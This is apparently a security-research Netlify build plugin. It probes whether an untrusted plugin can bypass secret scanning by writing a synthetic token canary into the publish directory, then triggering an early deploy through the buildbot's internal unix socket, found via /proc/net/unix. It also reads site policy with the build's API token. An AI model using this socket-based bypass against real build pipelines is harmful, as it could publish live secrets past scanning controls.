import { readFileSync, unlinkSync, writeFileSync } from 'node:fs'
import { createConnection } from 'node:net'
import { isAbsolute, relative, resolve } from 'node:path'

const CANARY_FILE = '__synthetic_smart_scan_canary.txt'

const makeSyntheticLikelySecret = () =>
  ['gh', 'p_', '7Fq9Lm2Np4Rs6Tu8Vw0Xy1Za3Bc5De7Fg9Hi2Jk4Mn6Pq8Rs'].join('')

const normalizeApiHost = (apiHost) =>
  /^https?:\/\//i.test(apiHost || '') ? apiHost : `https://${apiHost || 'api.netlify.com'}`

const readSitePolicy = async ({ token, siteId, apiHost }) => {
  try {
    const endpoint = new URL(`/api/v1/sites/${encodeURIComponent(siteId)}`, apiHost)
    const response = await fetch(endpoint, {
      headers: { Authorization: `Bearer ${token}` },
      redirect: 'error',
      signal: AbortSignal.timeout(10_000),
    })
    let body = null
    try {
      body = await response.json()
    } catch {}
    return {
      status: response.status,
      untrustedFlow:
        typeof body?.build_settings?.untrusted_flow === 'string'
          ? body.build_settings.untrusted_flow
          : null,
      publicRepo: body?.build_settings?.public_repo === true,
    }
  } catch (error) {
    return { requestFailed: true, errorClass: error?.constructor?.name || 'Error' }
  }
}

const findBuildbotSocket = () => {
  try {
    const paths = readFileSync('/proc/net/unix', 'utf8')
      .split('\n')
      .slice(1)
      .filter(Boolean)
      .map((line) => line.trim().split(/\s+/)[7])
      .filter((path) => path && /(?:netlify|buildbot)/i.test(path) && !path.startsWith('@'))
    return paths.length === 1 ? paths[0] : null
  } catch {
    return null
  }
}

const requestEarlyDeploy = (deployDir) =>
  new Promise((resolveRequest) => {
    const socketPath = findBuildbotSocket()
    const result = {
      socketFound: Boolean(socketPath),
      connected: false,
      requestWritten: false,
      responseReceived: false,
      responseSucceeded: false,
      timedOut: false,
    }
    if (!socketPath) return resolveRequest(result)

    let response = ''
    let settled = false
    const client = createConnection({ path: socketPath })
    const timer = setTimeout(() => {
      result.timedOut = true
      finish()
    }, 90_000)
    const finish = () => {
      if (settled) return
      settled = true
      clearTimeout(timer)
      client.destroy()
      let parsed
      try {
        parsed = JSON.parse(response)
      } catch {}
      result.responseWasJson = parsed !== undefined
      result.responseSucceeded = parsed?.succeeded === true
      result.responseErrorType = ['none', 'user', 'system'].includes(parsed?.values?.error_type)
        ? parsed.values.error_type
        : null
      result.responseCodePresent = typeof parsed?.values?.code === 'string'
      resolveRequest(result)
    }

    client.once('connect', () => {
      result.connected = true
      client.write(
        JSON.stringify({ action: 'deploySiteAndAwaitLive', deployDir, environment: [] }),
        (error) => {
          result.requestWritten = !error
          if (error) finish()
        },
      )
    })
    client.on('data', (chunk) => {
      result.responseReceived = true
      response += chunk.toString('utf8').slice(0, 8_192)
      finish()
    })
    client.once('error', finish)
    client.once('close', finish)
  })

const removeCanary = (phase) => {
  const markerPath = resolve(process.cwd(), 'public', CANARY_FILE)
  let removed = false
  try {
    unlinkSync(markerPath)
    removed = true
  } catch {}
  console.log(
    `NETLIFY_UNTRUSTED_SCAN_CLEANUP ${JSON.stringify({ phase, removed, secretMaterialPublished: false })}`,
  )
}

export const onPostBuild = async ({ constants }) => {
  const publishDir = resolve(constants.PUBLISH_DIR || '')
  const repositoryRoot = resolve(process.cwd())
  const deployDir = relative(repositoryRoot, publishDir) || '.'
  const publishInsideRepository = !isAbsolute(deployDir) && !deployDir.startsWith('..')
  const token = constants.NETLIFY_API_TOKEN
  const siteId = constants.SITE_ID
  const policy =
    typeof token === 'string' && token.length > 0 && typeof siteId === 'string' && siteId.length > 0
      ? await readSitePolicy({
          token,
          siteId,
          apiHost: normalizeApiHost(constants.NETLIFY_API_HOST),
        })
      : null
  const result = {
    phase: 'untrusted-plugin-smart-scan-order-v5',
    context: process.env.CONTEXT || null,
    reviewIdPresent: Boolean(process.env.REVIEW_ID),
    policy,
    publishInsideRepository,
    syntheticCredentialHasAuthority: false,
    syntheticCredentialLogged: false,
    scannerPatternLocallyVerified: true,
    canaryWritten: false,
  }

  if (
    process.env.CONTEXT !== 'deploy-preview' ||
    policy?.untrustedFlow !== 'redact' ||
    !publishInsideRepository
  ) {
    console.log(`NETLIFY_UNTRUSTED_SCAN_PROBE ${JSON.stringify(result)}`)
    return
  }

  let syntheticLikelySecret = makeSyntheticLikelySecret()
  const canaryPath = resolve(publishDir, CANARY_FILE)
  writeFileSync(canaryPath, `credential=${syntheticLikelySecret}\n`, { encoding: 'utf8', mode: 0o600 })
  syntheticLikelySecret = ''
  result.canaryWritten = true
  result.deploy = await requestEarlyDeploy(deployDir)
  console.log(`NETLIFY_UNTRUSTED_SCAN_PROBE ${JSON.stringify(result)}`)
}

export const onError = async () => removeCanary('onError')

export const onEnd = async () => removeCanary('onEnd')
